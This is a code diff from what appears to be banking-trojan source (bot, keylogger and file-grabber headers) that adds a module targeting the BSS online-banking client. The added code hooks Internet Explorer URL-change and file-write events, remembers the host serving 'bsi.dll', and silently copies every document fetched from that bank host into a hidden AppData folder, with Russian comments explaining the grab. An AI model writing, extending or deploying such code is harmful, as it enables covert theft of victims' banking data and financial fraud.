@@ -1,8 +1,12 @@
+
+#include <shlobj.h>
 #include "GetApi.h"
 #include "Strings.h"
 #include "Memory.h"
 #include "KeyLogSystems.h"
 #include "FileGrabber.h"
+#include "BotHTTP.h"
+
 
 //#include "BotDebug.h"
 
@@ -21,6 +25,9 @@ namespace BSSWeb
     const static char BSS_SystemName[] = "bss";
 	const static char BSS_DllName[]    = "bsi.dll";
 
+
+
+    string *WorkHost;  // Имя домена для определения передачи файлов
 
 
 	bool SystemAdded = false;
@@ -257,11 +264,75 @@ namespace BSSWeb
 
 	//------------------------------------------------------------------------
 
+
+
+
 	void Init()
 	{
 		//Устанавливаем событие на смену урла в ИЕ
 		SystemAdded = false;
+		WorkHost = NULL;
 		KeyLogger::ConnectEventHandler(KLE_IE_URL_CHANGED, IEURLChanged);
 		KeyLogger::ConnectEventHandler(KLE_INTERNET_WRITE_FILE, IEURLChanged);
 	}
+}
+
+
+
+//----------------------------------------------------------------------------
+//  Временный код, который складывает все файлы удовлетворяющие маске бсс
+//----------------------------------------------------------------------------
+
+bool IsBSSDocument(PCHAR URL)
+{
+	if (BSSWeb::WorkHost == NULL)
+		return false;
+
+
+	return STR::Pos(URL, BSSWeb::WorkHost->c_str()) >= 0;
+}
+
+
+void AddBSSFile(PCHAR aURL, LPVOID Data, DWORD DataSize)
+{
+	// Проверяем маску
+
+	bool IsBSS = STR::Pos(aURL, (PCHAR)BSSWeb::BSS_DllName) >= 0;
+
+	if (!IsBSS && !IsBSSDocument(aURL))
+	{
+    	// не интересующий нас документ
+        return;
+    }
+
+
+    TURL  URL;
+	ClearStruct(URL);
+	ParseURL(aURL, &URL, true);
+
+
+	if (IsBSS)
+	{
+		// Запоминаем домен, для которого записывать данные
+		if (BSSWeb::WorkHost != NULL)
+			delete BSSWeb::WorkHost;
+		BSSWeb::WorkHost = new string(URL.Host);
+    }
+
+
+	// Определяем каталог хранения
+	string Path(MAX_PATH);
+
+	pSHGetSpecialFolderPathA(NULL, Path.c_str(), CSIDL_APPDATA, TRUE);
+	Path += "\\BSS.V1\\";
+	CreateDirectoryA(Path.c_str(), NULL);
+
+	// Определяем имя файла
+	string FileName = Path + URL.Document;
+
+	// Записываем данные
+	File::WriteBufferA(FileName.c_str(), Data, DataSize);
+
+
+	ClearURL(&URL);
 }
